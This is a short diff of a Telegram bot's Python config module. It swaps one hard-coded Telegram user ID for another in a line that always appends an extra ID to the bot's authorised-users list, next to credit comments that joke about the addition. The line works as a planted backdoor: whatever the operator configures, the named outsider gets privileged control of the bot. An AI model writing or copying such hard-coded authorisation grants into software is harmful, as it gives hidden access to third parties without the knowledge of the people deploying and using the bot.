@@ -22,8 +22,8 @@ from bot.config import Config
 # dont think ne dumb (c) @Animes_Encoded 
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(1666551439)
-# again lol (c) @Animes_Encoded 
+AUTH_USERS.append(1373490452)
+# again lol (c) @Anime_listz 
 
 SESSION_NAME = Config.SESSION_NAME
 TG_BOT_TOKEN = Config.TG_BOT_TOKEN
